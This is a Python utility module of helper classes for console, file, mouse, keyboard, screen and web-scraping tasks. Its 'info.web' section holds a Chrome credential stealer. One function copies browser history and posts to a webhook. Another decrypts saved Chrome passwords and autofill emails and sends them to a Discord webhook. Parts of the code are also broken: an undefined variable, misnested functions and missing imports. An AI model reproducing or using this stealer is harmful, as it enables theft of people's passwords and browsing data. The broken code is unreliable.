import sys
import os
import shutil
import subprocess
import ctypes
import pyautogui
import requests
from bs4 import BeautifulSoup
import sqlite3
from scapy.all import *
import random

class tools:
    class console:
        def write(string):
            print(string)

        def read(string):
            input(string)

        def exit():
            sys.exit()
    
    class system:
        class edit:
            def move(source, destionation):
                try:
                    shutil.move(source, destionation)
                except Exception as e:
                    print(f'Error: {e}')

            def open(path):
                try:
                    subprocess.Popen(path)
                except Exception as e:
                    print(f'Error {e}')

            def wallpaper(path):
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
                except Exception as e:
                    print(f'Error {e}')

        class control:
            def mouse(x, y):
                pyautogui.moveTo(x=x, y=y)
                print(f'mouse relocated to {x}:{y}')

            def keyboard(text):
                pyautogui.write(text)
                print(f'written on keyboard')

        class Detection:
            @staticmethod
            def imgesp(image, confidence=0.8, action=None, *args, **kwargs):
                matches = list(pyautogui.locateAllOnScreen(image, confidence=confidence))
                if matches and action:
                    return action(*args, **kwargs)
                return matches 

            @staticmethod
            def coloresp(X, Y, R, G, B, tol=10, action=None, *args, **kwargs):
                match = pyautogui.pixelMatchesColor(x=X, y=Y, expectedRGBColor=(R, G, B), tolerance=tol)
                if match and action:
                    return action(*args, **kwargs)
                return match

    class override:
        class screen:
            def gdi32_force_pixel_color_change(X, Y, COLOR=0x0000FF):
                hdc = ctypes.windll.user32.GetDC(0)
                ctypes.windll.gdi32.SetPixel(hdc, X, Y, COLOR)
                ctypes.windll.user32.ReleaseDC(0, hdc)

    class network:
        pass

    class info:
        class web:
            @staticmethod
            def scrape(domain, Element=None, css=None, all=True):
                response = requests.get(url=domain)
                soup = BeautifulSoup(response.text, "html.parser")

                if all:
                    return soup.prettify()

                if css:
                    elements = soup.select(css)
                elif Element:
                    elements = soup.find_all(Element)
                else:
                    return None
            
                return [element.text for element in elements] if elements else None

            def get_chrome_history(webhook):
                history_db = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/History"
                temp_db = "chrome_history_temp.db"

                data = {"content": message}
                response = requests.post(webhook, json=data)

                shutil.copy2(history_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")

                history = cursor.fetchall()
    
                conn.close()
                os.remove(temp_db)

                if response.status_code == 204:
                    print("data sent to webhook.")
                else:
                    print(f"Data failed to send to webhook: {response.status_code}, {response.text}")

                return history

            def get_chrome_data(webhook):
                def extract_and_send_chrome_data():
               # Get Chrome encryption key
                    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                    with open(local_state_path, "r", encoding="utf-8") as file:
                                    local_state = json.load(file)
                                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                                    key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

               # Decrypt stored passwords
                def decrypt_password(encrypted_password):
                              try:
                                             iv = encrypted_password[3:15]
                                             encrypted_password = encrypted_password[15:]
                                             cipher = AES.new(key, AES.MODE_GCM, iv)
                                             return cipher.decrypt(encrypted_password).decode()
                              except Exception:
                                             return "Cannot decrypt"

               # Extract saved passwords
                passwords = []
                login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
                temp_db = "chrome_login_temp.db"
                os.system(f'copy "{login_db}" "{temp_db}"')

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for row in cursor.fetchall():
                              url, username, encrypted_password = row
                              decrypted_password = decrypt_password(encrypted_password)
                              passwords.append((url, username, decrypted_password))

                conn.close()
                os.remove(temp_db)

               # Extract saved emails
                emails = []
                autofill_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")
                temp_db = "chrome_autofill_temp.db"
                os.system(f'copy "{autofill_db}" "{temp_db}"')

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT DISTINCT email FROM autofill")

                emails = [row[0] for row in cursor.fetchall()]

                conn.close()
                os.remove(temp_db)

               # Send data to Discord
                webhook_url = webhook
                message = "**Extracted Chrome Data**\n\n"
                for url, username, password in passwords:
                              message += f"🌐 **URL**: {url}\n👤 **Username**: {username}\n🔑 **Password**: ||{password}||\n\n"
                message += "**📧 Saved Emails:**\n" + "\n".join(emails) if emails else "No saved emails found."
                payload = {"content": message}
                response = requests.post(webhook_url, json=payload)
                if response.status_code == 204:
                              print("✅ Data sent successfully to Discord!")
                else:
                              print(f"❌ Failed to send data: {response.status_code}, {response.text}")
